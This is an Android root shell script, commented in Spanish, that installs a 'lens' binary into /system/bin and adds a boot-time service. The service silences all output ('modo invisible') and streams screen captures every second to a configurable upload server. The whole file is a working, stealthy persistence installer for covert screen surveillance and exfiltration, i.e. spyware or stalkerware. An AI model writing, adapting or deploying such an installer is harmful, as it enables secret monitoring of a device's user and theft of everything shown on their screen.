#!/system/bin/sh
# install_root.sh - Instala lens como servicio del sistema (requiere root)
# Ejecutar en el dispositivo con: su -c sh /sdcard/Download/install_root.sh

set -e

echo "[*] Instalador de Lens (requiere root)"
if [ "$(id -u)" != "0" ]; then
    echo "[-] Este script debe ejecutarse como root. Ejecuta: su -c sh $0"
    exit 1
fi

# Configuración
LENS_BIN="/data/local/tmp/lens"   # Ruta donde está el binario (debes ponerlo antes)
SERVICE_DIR="/data/adb/service.d"
SERVICE_SCRIPT="$SERVICE_DIR/99_lens.sh"
TARGET_BIN="/system/bin/lens"     # Destino final
SERVER_URL="http://127.0.0.1:8080/upload"   # Cambia por tu servidor
INTERVAL_MS=1000

# Verificar que el binario existe
if [ ! -f "$LENS_BIN" ]; then
    echo "[-] No encuentro $LENS_BIN. Copia primero el binario a esa ubicación."
    exit 1
fi

# Montar /system como lectura-escritura
mount -o rw,remount /system

# Copiar binario a /system/bin y dar permisos
cp "$LENS_BIN" "$TARGET_BIN"
chmod 755 "$TARGET_BIN"
chown 0:0 "$TARGET_BIN"

# Crear directorio de servicios si no existe
mkdir -p "$SERVICE_DIR"

# Crear script de inicio
cat > "$SERVICE_SCRIPT" << EOF
#!/system/bin/sh
# Lens daemon - captura y envía pantalla
until [ "\$(getprop sys.boot_completed)" = "1" ]; do
    sleep 2
done
# Redirigir toda salida a /dev/null (modo invisible)
exec >> /dev/null 2>&1
$TARGET_BIN tap-stream "$SERVER_URL" $INTERVAL_MS &
echo \$! > /data/local/tmp/lens.pid
EOF

chmod 755 "$SERVICE_SCRIPT"
chown 0:0 "$SERVICE_SCRIPT"

# Volver a montar /system como solo lectura
mount -o ro,remount /system

echo "[+] Instalación completada."
echo "[*] El servicio se iniciará en el próximo reinicio."
echo "[*] Para arrancar ahora sin reiniciar:"
echo "    su -c 'sh $SERVICE_SCRIPT' &"